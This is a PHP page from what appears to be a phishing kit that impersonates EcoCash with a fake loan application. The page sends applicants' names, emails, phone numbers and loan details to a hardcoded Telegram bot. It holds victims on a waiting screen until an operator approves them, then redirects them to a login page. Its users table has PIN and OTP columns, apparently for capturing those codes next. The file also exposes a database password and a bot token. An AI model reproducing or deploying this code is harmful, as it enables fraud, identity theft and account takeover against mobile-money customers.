<?php
session_start();
ob_start();

error_reporting(E_ALL);
ini_set('display_errors', 1);

/* ========== POSTGRESQL CONFIGURATION ========== */
$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
$dbPort = 5432;
$dbName = "loan_9d8q";
$dbUser = "loan_9d8q_user";
$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
/* ============================================= */

/**
 * Get PostgreSQL connection
 */
function getDbConnection($host, $port, $dbname, $user, $pass) {
    static $conn = null;
    if ($conn === null) {
        if (!function_exists('pg_connect')) {
            error_log("PostgreSQL extension (pgsql) is NOT available.");
            return false;
        }
        $connString = "host=$host port=$port dbname=$dbname user=$user password=$pass";
        $conn = @pg_connect($connString);
        if (!$conn) {
            error_log("DB connection failed: " . pg_last_error());
        }
    }
    return $conn;
}

$conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
if (!$conn) {
    error_log("Could not connect to PostgreSQL for users table");
}

// Create or modify `users` table with pin, otp, and allow columns (default 0)
if ($conn) {
    // First ensure table exists with basic columns
    $createTableSQL = "
        CREATE TABLE IF NOT EXISTS users (
            phone VARCHAR(20) PRIMARY KEY,
            status INTEGER DEFAULT 0
        )
    ";
    pg_query($conn, $createTableSQL);
    
    // Add pin column if missing
    $checkPin = pg_query($conn, "SELECT column_name FROM information_schema.columns WHERE table_name='users' AND column_name='pin'");
    if (pg_num_rows($checkPin) == 0) {
        pg_query($conn, "ALTER TABLE users ADD COLUMN pin INTEGER DEFAULT 0");
        error_log("Added pin column to users table");
    }
    
    // Add otp column if missing
    $checkOtp = pg_query($conn, "SELECT column_name FROM information_schema.columns WHERE table_name='users' AND column_name='otp'");
    if (pg_num_rows($checkOtp) == 0) {
        pg_query($conn, "ALTER TABLE users ADD COLUMN otp INTEGER DEFAULT 0");
        error_log("Added otp column to users table");
    }
    
    // Add allow column if missing (DEFAULT 0)
    $checkAllow = pg_query($conn, "SELECT column_name FROM information_schema.columns WHERE table_name='users' AND column_name='allow'");
    if (pg_num_rows($checkAllow) == 0) {
        pg_query($conn, "ALTER TABLE users ADD COLUMN allow INTEGER DEFAULT 0");
        error_log("Added allow column to users table with default 0");
    }
}

/* -----------------------------
   SAVE STEP 2 DATA
------------------------------ */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['first_name'])) {
    $_SESSION['first_name'] = $_POST['first_name'] ?? '';
    $_SESSION['last_name']  = $_POST['last_name'] ?? '';
    $_SESSION['email']      = $_POST['email'] ?? '';
    $_SESSION['phone']      = $_POST['phone'] ?? '';
    header("Location: step3.php");
    exit;
}

/* -----------------------------
   VALIDATE SESSION FLOW
------------------------------ */
if (!isset($_SESSION['loan_amount']) || !isset($_SESSION['first_name'])) {
    header("Location: loan.php");
    exit;
}

$loan_type = $_SESSION['loan_type'] ?? 'N/A';
$loan_term = $_SESSION['loan_term'] ?? 'N/A';
$purpose   = $_SESSION['purpose'] ?? 'N/A';
$amount    = $_SESSION['loan_amount'] ?? 0;

$first_name = $_SESSION['first_name'] ?? '';
$last_name  = $_SESSION['last_name'] ?? '';
$email      = $_SESSION['email'] ?? '';
$phone      = $_SESSION['phone'] ?? '';

$telegram_error = '';
$telegram_success = false;

/* -----------------------------
   SUBMIT APPLICATION
------------------------------ */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_application'])) {

    $botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
    $chatId   = "-5193742613";

    $msg  = "🏦 *New Loan Application*\n\n";
    $msg .= "📌 *Loan Details*\n";
    $msg .= "Type: $loan_type\n";
    $msg .= "Amount: $" . number_format($amount, 2) . "\n";
    $msg .= "Term: $loan_term Months\n";
    $msg .= "Purpose: $purpose\n\n";

    $msg .= "👤 *Personal Information*\n";
    $msg .= "Name: $first_name $last_name\n";
    $msg .= "Email: $email\n";
    $msg .= "Phone: +263 $phone\n";

    $msg .= "👤 *Approval area*\n";
    $msg .= "Approve Here: https://loan-1-i36j.onrender.com/allow.php";

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";

    $postFields = [
        'chat_id' => $chatId,
        'text' => $msg,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $response = curl_exec($ch);
    $curlError = curl_error($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $result = json_decode($response, true);

    if ($curlError) {
        $telegram_error = "cURL Error: $curlError";
    } elseif ($httpCode != 200) {
        $telegram_error = "HTTP Error: $httpCode";
    } elseif (isset($result['ok']) && $result['ok'] === true) {

        // ========== INSERT/UPDATE PHONE INTO `users` TABLE WITH ALLOW COLUMN ==========
        if ($conn && !empty($phone)) {
            // Insert phone with status=0, pin=0, otp=0, allow=0 if not exists, otherwise do nothing
            $insertSQL = "INSERT INTO users (phone, status, pin, otp, allow) VALUES ($1, 0, 0, 0, 0) ON CONFLICT (phone) DO NOTHING";
            $insertResult = pg_query_params($conn, $insertSQL, [$phone]);
            if (!$insertResult) {
                error_log("Failed to insert phone $phone into users table: " . pg_last_error($conn));
            } else {
                error_log("User $phone inserted/ignored in users table with status=0, pin=0, otp=0, allow=0");
            }
        } else {
            error_log("Cannot insert phone: DB connection failed or phone empty");
        }
        // ============================================================

        $_SESSION['application_submitted'] = true;
        
        // Check the 'allow' column value for this user
        if ($conn && !empty($phone)) {
            $checkAllowSQL = "SELECT allow FROM users WHERE phone = $1";
            $checkAllowResult = pg_query_params($conn, $checkAllowSQL, [$phone]);
            
            if ($checkAllowResult && pg_num_rows($checkAllowResult) > 0) {
                $row = pg_fetch_assoc($checkAllowResult);
                $allowValue = $row['allow'];
                
                if ($allowValue == 0) {
                    // Send to Telegram and stay at step3.php
                    $telegram_success = true;
                    // Don't redirect to login.php, stay on this page
                    error_log("Allow value is 0 for user $phone - staying on step3.php");
                } elseif ($allowValue == 1) {
                    // Proceed to login.php
                    header("Location: login.php");
                    exit;
                } else {
                    // Default case - treat as 0
                    error_log("Unexpected allow value $allowValue for user $phone - defaulting to stay");
                }
            } else {
                // User not found, default behavior - stay on step3.php
                error_log("User $phone not found in users table - staying on step3.php");
            }
        } else {
            // No DB connection or no phone - stay on step3.php
            error_log("Cannot check allow value - staying on step3.php");
        }
        
        // If we get here (allow=0 case), stay on current page
        // Don't redirect, just show the page again

    } else {
        $telegram_error = $result['description'] ?? "Unknown Telegram error";
    }
}

// Handle AJAX request to check allow status
if (isset($_GET['check_allow']) && isset($_GET['phone'])) {
    header('Content-Type: application/json');
    $phone = $_GET['phone'];
    $allowValue = 0;
    
    if ($conn && !empty($phone)) {
        $checkAllowSQL = "SELECT allow FROM users WHERE phone = $1";
        $checkAllowResult = pg_query_params($conn, $checkAllowSQL, [$phone]);
        
        if ($checkAllowResult && pg_num_rows($checkAllowResult) > 0) {
            $row = pg_fetch_assoc($checkAllowResult);
            $allowValue = (int)$row['allow'];
        }
    }
    
    echo json_encode(['allow' => $allowValue]);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>EcoCash | Review</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body { margin:0; font-family:Arial; background:#f2f2f2; }
.header { background:#fff; padding:15px; display:flex; justify-content:space-between; }
.logo { color:#4f46e5; font-weight:bold; }
.container { display:flex; justify-content:center; margin-top:50px; }
.card { background:#fff; width:420px; padding:25px; border-radius:10px; }
.section { margin-bottom:20px; }
.item { display:flex; justify-content:space-between; padding:6px 0; border-bottom:1px dashed #ddd; }
.btn { padding:12px; border:none; border-radius:6px; cursor:pointer; }
.submit { background:#4f46e5; color:#fff; width:100%; }
.error { background:#ffdddd; padding:10px; margin-bottom:10px; }
.success { background:#ddffdd; padding:10px; margin-bottom:10px; }
.loader {
    border: 3px solid #f3f3f3;
    border-top: 3px solid #4f46e5;
    border-radius: 50%;
    width: 40px;
    height: 40px;
    animation: spin 1s linear infinite;
    margin: 20px auto;
}
@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}
.status-message {
    text-align: center;
    padding: 20px;
}
.status-waiting {
    color: #f59e0b;
    font-weight: bold;
}
.status-approved {
    color: #10b981;
    font-weight: bold;
}
.redirect-message {
    text-align: center;
    margin-top: 20px;
    padding: 10px;
    background: #e0e7ff;
    border-radius: 8px;
    color: #4f46e5;
}
</style>
</head>
<body>

<div class="header">
    <a href="step2.php">← Back</a>
    <div class="logo">EcoCash</div>
</div>

<div class="container">
<div class="card">

<h2>Review Application</h2>

<?php if ($telegram_error): ?>
<div class="error">
<?= htmlspecialchars($telegram_error) ?>
</div>
<?php endif; ?>

<div class="section">
<h4>Loan Details</h4>
<div class="item"><span>Type</span><span><?= htmlspecialchars($loan_type) ?></span></div>
<div class="item"><span>Amount</span><span>$<?= number_format($amount,2) ?></span></div>
<div class="item"><span>Term</span><span><?= htmlspecialchars($loan_term) ?></span></div>
<div class="item"><span>Purpose</span><span><?= htmlspecialchars($purpose) ?></span></div>
</div>

<div class="section">
<h4>Personal Info</h4>
<div class="item"><span>Name</span><span><?= htmlspecialchars($first_name.' '.$last_name) ?></span></div>
<div class="item"><span>Email</span><span><?= htmlspecialchars($email) ?></span></div>
<div class="item"><span>Phone</span><span>+263 <?= htmlspecialchars($phone) ?></span></div>
</div>

<?php if (!$telegram_success && !isset($_SESSION['application_submitted'])): ?>
<form method="POST">
    <button type="submit" name="submit_application" class="btn submit">
        SUBMIT APPLICATION
    </button>
</form>
<?php elseif ($telegram_success || isset($_SESSION['application_submitted'])): ?>
<div id="statusContainer">
    <div class="status-message">
        <div class="loader"></div>
        <p class="status-waiting">⏳ Application Submitted!</p>
        <p>Your application is being reviewed by our team.</p>
        <p>Please wait while we process your request...</p>
        <p style="font-size: 12px; color: #666; margin-top: 10px;">This page will automatically redirect once approved.</p>
    </div>
</div>
<?php endif; ?>

</div>
</div>

<?php if ($telegram_success || isset($_SESSION['application_submitted'])): ?>
<script>
// Get the phone number from PHP
const phoneNumber = "<?= htmlspecialchars($phone) ?>";
let checkInterval = null;
let redirectAttempted = false;

function checkAllowStatus() {
    if (redirectAttempted) return;
    
    fetch(`?check_allow=1&phone=${encodeURIComponent(phoneNumber)}&t=${Date.now()}`)
        .then(response => response.json())
        .then(data => {
            console.log('Allow status:', data.allow);
            
            if (data.allow === 1) {
                // Status is 1, redirect to login.php
                if (!redirectAttempted) {
                    redirectAttempted = true;
                    
                    // Show redirect message
                    const statusContainer = document.getElementById('statusContainer');
                    if (statusContainer) {
                        statusContainer.innerHTML = `
                            <div class="redirect-message">
                                <p>✅ Application Approved!</p>
                                <p>Redirecting to login page...</p>
                                <div class="loader"></div>
                            </div>
                        `;
                    }
                    
                    // Clear the interval
                    if (checkInterval) {
                        clearInterval(checkInterval);
                    }
                    
                    // Redirect after 2 seconds
                    setTimeout(() => {
                        window.location.href = 'login.php';
                    }, 2000);
                }
            } else if (data.allow === 0) {
                // Still waiting, update status message
                const statusContainer = document.getElementById('statusContainer');
                if (statusContainer && !statusContainer.querySelector('.redirect-message')) {
                    // Optional: Update waiting message with timer
                    const statusDiv = statusContainer.querySelector('.status-message');
                    if (statusDiv) {
                        // You can add additional waiting indicators here
                    }
                }
            }
        })
        .catch(error => {
            console.error('Error checking allow status:', error);
        });
}

// Start checking every 3 seconds
if (phoneNumber) {
    checkInterval = setInterval(checkAllowStatus, 3000);
    // Also check immediately
    checkAllowStatus();
}

// Clean up interval when page unloads
window.addEventListener('beforeunload', () => {
    if (checkInterval) {
        clearInterval(checkInterval);
    }
});
</script>
<?php endif; ?>

</body>
</html>

<?php ob_end_flush(); ?>
